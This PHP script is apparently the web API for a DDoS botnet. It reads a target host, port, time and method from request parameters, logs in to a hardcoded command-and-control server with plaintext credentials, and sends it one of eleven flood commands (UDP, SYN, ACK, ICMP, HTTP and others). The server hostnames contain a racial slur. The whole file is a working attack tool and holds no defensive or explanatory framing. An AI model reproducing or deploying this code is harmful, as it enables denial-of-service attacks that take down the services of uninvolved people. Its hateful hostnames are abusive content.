<?php
//API Link: http://bots.niggerkiller.xyz/YunoApi.php?key=$key&host=$host&port=$port&time=$time&method=$method
set_time_limit(0);
 
$server = "api.niggerkiller.xyz";
$conport = 420;
$username = "Nova";
$password = "Novalovesarashi";
$APIKeys = array("NovaIsMyFan");
 
$method = $_GET['method'];
$target = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];
$key = $_GET['key'];

if (!isset($_GET["key"]) || !isset($_GET["host"]) || !isset($_GET["port"]) || !isset($_GET["method"]) || !isset($_GET["time"]))
    die("<p>You are missing a parameter");
if (!in_array($key, $APIKeys)) die("Invalid API key");

if($method == "LOW"){$command = "pudp $target $port $time psize=256 cons=6";}
if($method == "SURGE"){$command = "pudp $target $port $time psize=768 cons=20 active=t";}
if($method == "PPS"){$command = "pudp $target $port $time psize=0 active=t";}
if($method == "JUNK"){$command = "udp $target $port $time psize=512 cons=5";}
if($method == "TCP"){$command = "tcp $target $port $time psize=120 cons=15";}
if($method == "SYN"){$command = "tcp $target $port $time psize=512 tcpflags=s cons=15";}
if($method == "ACK"){$command = "tcp $target $port $time psize=256 tcpflags=a cons=15";}
if($method == "HANDSHAKE"){$command = "ptcp $target $port $time psize=512 cons=30";}
if($method == "MIX"){$command = "mix $target $port $time psize=512";}
if($method == "ICMP"){$command = "icmp $target $port $time cons=15 psize=69";}
if($method == "HTTP"){$command = "http $target $port $time cons=30";}

if(isset($_GET["domain"]))
    echo "using domain ".$_GET["domain"];$command = $command." domain=".$_GET["domain"];

$sock = fsockopen($server, $conport, $errno, $errstr, 2);
 
if(!$sock){
        echo "Couldn't Connect To CNC Server Please Check CNC Creds...";
} else{
        print(fread($sock, 512)."\r\n");
        fwrite($sock, $username . "\r\n");
        echo "<br>";
        print(fread($sock, 512)."\r\n");
        fwrite($sock, $password . "\r\n");
        echo "<br>";
        if(fread($sock, 512)) {
                print(fread($sock, 512)."\r\n");
        }
 
        fwrite($sock, $command . "\r\n");
        fclose($sock);
        echo "<br>";
        echo "> $command ";
}
?>